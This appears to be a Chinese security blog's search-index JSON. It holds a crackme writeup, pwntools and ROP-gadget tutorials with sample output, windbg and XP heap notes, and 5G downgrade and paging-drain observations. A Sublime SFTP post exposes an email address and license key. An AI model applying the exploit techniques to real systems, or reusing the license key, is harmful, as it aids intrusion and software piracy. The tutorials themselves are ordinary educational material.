v31 = 1035; return PostMessageW(*(HWND *)(v2 + 4), 0x111u, v31, 0);// 正确 } } }其中v3便是输入的字符串，其实前面经过两次相同的亦或，并将小写变为了大写。一个字符这里是两个字节，while判断的是第三到第六四个字符，因此依次为 15pb。由前面函数可知一共包含7位，现在差前两位和最后一位 XX15pbX。这里sub_401740函数有一次判断，分析后这里是求出另外三位。判断核心在12345678910111213v14 = &amp;v20;v15 = &apos;1&apos;;while ( *(_WORD *)v14 == *(_WORD *)((char *)v14 + v2 - (_DWORD)&amp;v20) )// 前两位 { v15 += 6; v14 = (__int128 *)((char *)v14 + 2); if ( v15 &gt; &apos;9&apos; ) { if ( *(_WORD *)v2 + *((_WORD *)v8 + 9) == 99 &amp;&amp; *(_WORD *)v17 == *(_DWORD *)v18 + *((_WORD *)v8 + 6) ) return 1; // 最后一位 return 0; } }v2是传入的字符串，v20是1-9 9个数字，因此即可得到第一位第二位依次是 12核心在于 v18是尝试的次数，v8是将v20和v2从第v3个开始两个串拼接复制过去，因此当v3=1时，v8存放的是v20+”215pbX”1v8 = sub_4028D0((int)&amp;v20, v2 + 2 * *(_DWORD *)v3); //v3和v18一样，存放的是次数这里v17是最后一位，前面有赋值，因此需要保证(_WORD )v2 + *((_WORD *)v8 + 9) == 99，即49+50，即v8+9 为2，表示v3=1，因此对应后面v17=1+7=8所以Flag为 *1215pb8***","link":"/2017/01/31/kanxue-1/"},{"title":"gdb command","text":"gdb 命令条件断点1234567command [breakpoints num][语句]endgdb&gt;command 1gdb&gt;print &quot;a=%s b=%s&quot;, a, bgdb&gt;end 查看内存1234567x/[n][f][u]n表示显示的个数f表示显示的方式 (x表示十六进制，c表示字符形式，即ASCII，u表示十进制)u表示一个地址单元长度 (b为单字节，h为双字节)x/gx $rspgx表示64位 16进制显示参考：http://blog.chinaunix.net/uid-22889415-id-3045933.html 输出信息到文件1234gdb&gt;set logging file xx.txtgdb&gt;set logging on gdb&gt;#do somethinggdb&gt;set logging off","link":"/2017/04/14/gdb-command/"},{"title":"内存对齐","text":"在看C++反汇编一书时，在类的一章前面介绍了结构体中变量的内存分配，会遵循一些对齐的原则，导致分配的字节数会有所差异。那么问题是，为什么要使用内存对齐，以及遵循哪些规则。 为什么内存对齐这和CPU有关，32位的CPU对应的是一次从内存中读取4字节，并且每次都是从4的倍数的地址开始读。使用内存对其主要避免的是，本可以一次读取的变量需要两次读取。假设一个4字节的int型变量，若存储在0x03 - 0x06地址的话，那么需要读取两次，才能取出这个值，先读取0x00-0x03这四个字节，然后再读取0x04-0x07这四个字节，这样会导致读取效率降低；若按照对齐原则，只需将其分配在0x04 - 0x07即可，一次便能够读出。","link":"/2017/01/02/memory-alignment/"},{"title":"priority queue","text":"C++的优先队列使用 优先队列特点优先队列维护在队列头部维持一个最值，使用堆结构进行维护因此插入的时间复杂度为log(n)，n为此时树中的元素个数，取出最值的时间复杂度为O(1)默认为维持最大值，大根堆12#include &lt;queue&gt;priority_queue&lt;int&gt; heap ; 比较函数维持最小值123456789101112131415#include &lt;queue&gt;struct cmp{ bool operator()(int a, int b) { return a &gt; b ; } };int main(){ priority_queue&lt;int, vector&lt;int&gt;, cmp&gt; heap ; heap.push(1) ; //插入元素 heap.top() ; //取出最值 heap.pop() ; //删除最值} 原型1priority_queue&lt;Type, Container, Functional&gt;Type： 基本元素的数据类型类型Container：保存数据的容器，必须是数组实现的容器，比如vector，deque，默认用的是vectorFunctional：比较方法 参考http://www.cnblogs.com/flyoung2008/articles/2136485.html","link":"/2017/01/23/priority-queue/"},{"title":"ollydbg run trace","text":"使用run trace跟踪代码执行，用于去除花指令以及一些混淆 打开run trace 设置起始位置 和 结束位置 断点 执行 跟踪步入 或 跟踪步过 查看 run trace视图，则为执行过的语句代码 使用该方法也可以在一些判断条件很多的代码中 直接提取出该条件下所执行的代码。 参考：http://blog.csdn.net/liujiayu2/article/details/56940831","link":"/2017/11/27/ollydbg-run-trace/"},{"title":"科学和伪科学","text":"其实关于这个一个论述，各种说法也是。要么就是站在这个理论，要么就是站在那个高度上，感觉还是说得太虚、太扯了。最近看了一个描述，感觉很不错，有一种看着就觉得很有道理，就是那种感觉是有道理，但是却说不清楚。。。 如何判断马克思主义是不是伪科学？如果马克思主义的信仰者在心里设定一些规则，认为如果这些规则被破坏，就会认为马克思主义是伪科学，那么马克思主义就是科学的；否则的话，那就是伪科学了。 参考http://mp.weixin.qq.com/s/fK6QGNWR8tTjG9twOewDkQ","link":"/2017/12/06/pseudoscience/"},{"title":"pwntools 介绍","text":"参考多篇blog的一个总结与测试 pwntoolspwntools 是一款专门用于CTF Exploit的python库，能够很方便的进行本地与远程利用的切换，并且里面包含多个模块，使利用变得简单。可以在github上直接搜索pwntools 进行安装。 基本模块asm : 汇编与反汇编，支持x86/x64/arm/mips/powerpc等基本上所有的主流平台dynelf : 用于远程符号泄漏，需要提供leak方法elf : 对elf文件进行操作，可以获取elf文件中的PLT条目和GOT条目信息gdb : 配合gdb进行调试，设置断点之后便能够在运行过程中直接调用GDB断下，类似于设置为即使调试JITmemleak : 用于内存泄漏shellcraft : shellcode的生成器 asm 汇编模块这个模块提供一些基本的汇编与反汇编操作，一般可以用linux的objdump以及IDA Pro能够完成基本的需求。 dynelf 模块还未试过 elf 模块这是一个静态模块，即静态加载ELF文件，然后通过相关接口获取一些信息，常用接口有：got 获取指定函数的GOT条目plt 获取指定函数的PLT条目address 获取ELF的基址symbols 获取函数的实际地址（待确定）使用例子：1(例子) gdb 模块该模块用于调用gdb调试在python文件中直接设置断点，当运行到该位置之后就会断下123456import pwnlibfrom pwn import *p = process(&apos;./c&apos;)pwnlib.gdb.attach(p) rop 模块用于自动产生ROP链 还不支持X64?123456789101112elf = ELF(&apos;ropasaurusrex&apos;)rop = ROP(elf)rop.call(&apos;read&apos;, (0, elf.bss(0x80)))rop.dump() ## 展示当前的ROP chain### 搜索指定指令 rop.search(move=0, regs=None, order=&apos;size&apos;)&apos;&apos;&apos;move(int)，栈指针调整的字节数regs(list)，搜索的寄存器listorder(str)，多个gadgets的排序方式，可选值=[&apos;size&apos;, &apos;regs&apos;]&apos;&apos;&apos;rop.r13_r14_r15_rbp == rop.search(regs=[&apos;r13&apos;,&apos;r14&apos;,&apos;r15&apos;,&apos;rbp&apos;], order = &apos;regs&apos;)rop.call, 两个参数，第一个是需要call的函数或者一个地址，第二个是函数参数，为list，只有一个参数需要在后面加上一个’,’使其变为list也可以使用ROPgadget进行gadget搜索 参考https://pwntools.readthedocs.io/en/stable/http://brieflyx.me/2015/python-module/pwntools-intro/http://brieflyx.me/2015/python-module/pwntools-advanced/","link":"/2017/04/18/pwntools/"},{"title":"router emulate-firmadyne","text":"从firmadyne学习路由器的仿真流程了解路由器的仿真主要是了解路由器是怎么运行的，固件是什么？需要什么其他的支持等。 网络，NVRAM","link":"/2017/02/14/router-emulate-firmadyne/"},{"title":"search rop gadgets","text":"提供几种rop gadgets搜索的方法, 主要来源于网上的blog, 主要是总结一下 Immunity Debugger Mona因为以前一直使用的是OD, 没有使用Immunity Debugger, 因此没有实际尝试, 推荐一篇Blog.https://huirong.github.io/2015/12/18/mona/搜索DLL中的ROP链1!mona rop -m msvcrt.dll MSFrop metasploit的一个小工具这个在Kali上就有, 可以对DLL进行搜索, 使用也很方便, 可以参考:https://www.offensive-security.com/metasploit-unleashed/Msfrop/ ROPgadget基本用法12345678910111213141516$ ROPgadget --binary c --only &quot;pop|pop|ret&quot;Gadgets information============================================================0x000000000040071c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x000000000040071e : pop r13 ; pop r14 ; pop r15 ; ret0x0000000000400720 : pop r14 ; pop r15 ; ret0x0000000000400722 : pop r15 ; ret0x000000000040071b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x000000000040071f : pop rbp ; pop r14 ; pop r15 ; ret0x00000000004005b0 : pop rbp ; ret0x0000000000400723 : pop rdi ; ret0x0000000000400721 : pop rsi ; pop r15 ; ret0x000000000040071d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret0x00000000004004d1 : retUnique gadgets found: 11安装&amp;详细使用参考https://github.com/JonathanSalwan/ROPgadget OD中的搜索因为一直用的OD调试, 所以用这个比较方便, 给出几个使用图就比较清楚了. 语法很简洁1234R8, R16, R32 for any 8, 16, 32 bit register respectively.CONST for any constantJCC for any conditional jumpANY n for any 0..n commands参考 http://auntitled.blogspot.com/2010/12/use-ollydbg-to-find-rop-gadgets.html","link":"/2017/01/06/search-rop-gadgets/"},{"title":"strstr - 字符串匹配","text":"做字符串匹配，leetcode 28题，实现strstr函数，在一个字符串中去找是否存在另一个字符串。暴力解，直接扫O(n^2)，C++中该函数也是这么实现的。因为在扫的过程中会存在一些已经扫过的重新扫，记录一下相关信息减少复杂度到O(n)，就是KMP算法。 参考http://www.cppblog.com/suiaiguo/archive/2009/07/16/90237.html","link":"/2017/01/24/strstr/"},{"title":"Sublime Plugins","text":"Disable UpdatePreferences -&gt; setting -&gt; user-setting 写入{ “update_check”: false} SFTP可以在本地编写代码部署到远程机器上运行https://wbond.net/sublime_packages/sftp/installation注意Windows下的remote_path的格式，如果是 c:\\11文件夹，则应该是/cygdrive/c/11 Preferences -&gt; Package Setting -&gt; SFTP -&gt; user-setting注册码：1234{ &quot;email&quot;: &quot;xiaosong@xiaosong.me&quot;, &quot;product_key&quot;: &quot;d419f6-de89e9-0aae59-2acea1-07f92a&quot;}http://www.cnblogs.com/jiqing9006/p/5558516.html DjaneiroDjango模块和关键字高亮插件https://packagecontrol.io/packages/Djaneiro","link":"/2017/09/12/sublime-plugin/"},{"title":"5G安全-发现的几个小问题","text":"在看协议的时候发现了几个小问题,其实当时也没觉得是什么问题,有个问题是在1月份的左右发现,也没咋关注了,到了6,7月整理内容的时候想着整理一下信息给3GPP报一下,发现给最新的文档竟然给修了. 感觉挺诧异的……分享一下,危害不大,攻击成本太高. EN-DC UE Capbility Information问题这个是在看EN-DC，非独立组网的注册流程发现．详细可以参考： https://www.eventhelix.com/5G/non-standalone-access-en-dc/en-dc-secondary-node-addition.pdf 其中有一个流程是基站给UE发送UE Capability Enquiry来查询UE所能支持的网络类型能力,在TS 36331中有描述: UE收到后会把自己支持的网络能力发给基站,为了后面正常上网流程. 因为该过程是比较重要的, 比如我们能够中间人修改UECapabilityInformation让基站认为UE只支持GSM的话,那么UE就没法正常用LTE/5G,那么就能够实现降级. 我在看流程的时候,发现该过程竟然在AS Security之前. 这个时候我们只要中间人,就可以随便修改了. 但其实协议文档中其实也没很明确指出来, TS 36331 f80, 5.6.3中的描述中,其实就没有考虑UECapabilityInformation的发送前提限制．相当简单的一句话： 我一直由最新往前找，发现就是在TS 36331 f90 (2020/3/31)中添加了相关修复…… 明确强调了必须在AS Security之后才认UE发送过来的UECapabilityInformation. paging耗电其实算是一个比较水的问题,其实我们搭建一套伪基站的环境,就能够发送Paging. 主要是把目标放在5G场景下的IoT设备上就有点意思了，因为为了节省用电，一些IoT设备都是IDLE的状态，要是能够paging唤醒的话，就能够消耗电量． 但其实像一些场景下，那些IoT设备也就定期检查一些消息…… 其他……","link":"/2020/09/23/small-problems/"},{"title":"5G安全-概念之TA/TAI","text":"TA：Tracking Area; 这块的概念主要是混在cell里面,容易乱. TA/TAI这块以及相关内容在LTE环境下伪基站,降级攻击这块使用是相当广泛的.联系上tracking area update request, reject. TA只要用途是方面核心网MME对用户的追踪,因为一般UE不会一直保持connect的状态,此时要是来了一个电话或者其他信息的时候,MME会将依据TA向该UE进行Paging． 一开始注册入网的时候，UE发起Attach Request,而后MME会回应Attach accept,会给UE分配一个初始的TAI List(大小在1~16),要是在这个区域内活动,是不会触发TAU(tracking area update). 先抓的新鲜出炉的attach accept, TAI LIST大小是1 关于TAI(Identity), TAC(code), Cell. tai就是ta的一个标识, 它在tac的基础上加了运营商相关信息,也就是mcc和mnc,在抓的包中很容易看出来. 然后就是Cell, tracking area的area我们可以知道是区域, 所以关系是一个TA可以由一个或多个Cell组成,而一个cell只能属于一个TA. 相关概念可以参考:https://wenku.baidu.com/view/4def34a9561252d380eb6ecf.html 后续在这些概念清晰了之后,后面要是相关的cell reselection 触发 tau request, 然后 tau reject的话就会清晰很多了.","link":"/2020/09/24/ta-tai/"},{"title":"Xp heap","text":"windbg 调试来看XpSp3 heap 基本概念堆 一个进程能有多个堆，+0x58指向堆中的第一个堆段，C++一般用HeapCreate创建，每个堆至少有一个堆段堆段 一个堆最多有64个堆段，+0x20(FirstEntry)指向堆段中的第一个堆块，C++一般用HeapAlloc创建堆块 实际的堆内存使用关于堆的实际分配使用堆管理器通过Windows虚拟内存管理器分配一大块内存(堆段)，这块内存将被分为大小不同的堆块来满足实际的分配。 当一个堆段耗尽所有空间后，堆管理器将创建另一个新的堆段。 堆管理流程堆管理包括前端堆管理和核心堆层管理两个部分，前端堆管理 主要用于快速的堆块分配以及被释放的堆块的重利用，因此在申请一个堆块的时候，会首先查询前端堆部分有没有可用的堆块，当没有的之后才会去查看核心堆管理。前端堆管理 包括Lookaside list（快表），低碎片堆。 申请堆块 申请一个堆块，首先查看快表中是否有合适的堆块，若有则分配，若没有则继续查看freelist中是否有合适的堆块，若没有则正常划分一个空堆块分配。","link":"/2017/01/19/windows-heap/"},{"title":"windbg exploitable 扩展","text":"Windbg包含一个额外的扩展 MSEC.dll, 可以通过加载该DLL来判断一个Crash是否有可利用性, 尤其是对于空指针的Crash.使用也很简单, 首先下载后将其放在 Debugging Tools for Windows (x86)\\winext文件下.使用Windbg加载Crash1234567(f34.524): Access violation - code c0000005 (!!! second chance !!!)eax=03f860b8 ebx=00000000 ecx=03f860b8 edx=00000000 esi=03f860b8 edi=00000000eip=65ac68e0 esp=03df9c30 ebp=03df9c44 iopl=0 nv up ei pl zr na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00010246*** ERROR: Symbol file could not be found. Defaulted to export symbols for C:\\Windows\\system32\\MSHTML.dll - MSHTML!CreateCoreWebView+0x9db30:65ac68e0 f7470800000010 test dword ptr [edi+8],10000000h ds:0023:00000008=???????? 然后加载MSEC.dll10:013&gt; !load winext\\MSEC.dll 判断是否可利用1234567890:013&gt; !exploitable!exploitable 1.6.0.0*** ERROR: Symbol file could not be found. Defaulted to export symbols for C:\\Windows\\System32\\jscript9.dll - *** ERROR: Symbol file could not be found. Defaulted to export symbols for C:\\Windows\\system32\\msvcrt.dll - Exploitability Classification: PROBABLY_NOT_EXPLOITABLERecommended Bug Title: Read Access Violation near NULL starting at MSHTML!CreateCoreWebView+0x000000000009db30 (Hash=0xcf51cc36.0xd0bfbfe5)This is a user mode read access violation near null, and is probably not exploitable.** PROBABLY_NOT_EXPLOITABLE ** 说明基本上不能利用 参考: https://tedazhar.wordpress.com/2011/12/27/windbg-exploitable-extension/","link":"/2017/02/23/windbg-exploitable/"}],"tags":[{"name":"5G","slug":"5G","link":"/tags/5G/"},{"name":"vuls","slug":"vuls","link":"/tags/vuls/"},{"name":"uaf","slug":"uaf","link":"/tags/uaf/"},{"name":"windbg","slug":"windbg","link":"/tags/windbg/"},{"name":"heap","slug":"heap","link":"/tags/heap/"},{"name":"Debug","slug":"Debug","link":"/tags/Debug/"},{"name":"basic","slug":"basic","link":"/tags/basic/"},{"name":"linux","slug":"linux","link":"/tags/linux/"},{"name":"browser","slug":"browser","link":"/tags/browser/"},{"name":"iots","slug":"iots","link":"/tags/iots/"},{"name":"rop","slug":"rop","link":"/tags/rop/"},{"name":"fuzz","slug":"fuzz","link":"/tags/fuzz/"},{"name":"reverse","slug":"reverse","link":"/tags/reverse/"},{"name":"gdb","slug":"gdb","link":"/tags/gdb/"},{"name":"c++","slug":"c","link":"/tags/c/"},{"name":"ollydbg","slug":"ollydbg","link":"/tags/ollydbg/"},{"name":"science","slug":"science","link":"/tags/science/"},{"name":"pwn","slug":"pwn","link":"/tags/pwn/"},{"name":"router","slug":"router","link":"/tags/router/"},{"name":"tools","slug":"tools","link":"/tags/tools/"},{"name":"debug","slug":"debug","link":"/tags/debug/"}],"categories":[{"name":"5G","slug":"5G","link":"/categories/5G/"},{"name":"vuls","slug":"vuls","link":"/categories/vuls/"},{"name":"browser","slug":"browser","link":"/categories/browser/"},{"name":"linux","slug":"linux","link":"/categories/linux/"},{"name":"basic","slug":"basic","link":"/categories/basic/"},{"name":"iots","slug":"iots","link":"/categories/iots/"},{"name":"fuzz","slug":"fuzz","link":"/categories/fuzz/"},{"name":"ctf","slug":"ctf","link":"/categories/ctf/"},{"name":"coding","slug":"coding","link":"/categories/coding/"},{"name":"随便看看","slug":"随便看看","link":"/categories/%E9%9A%8F%E4%BE%BF%E7%9C%8B%E7%9C%8B/"}]}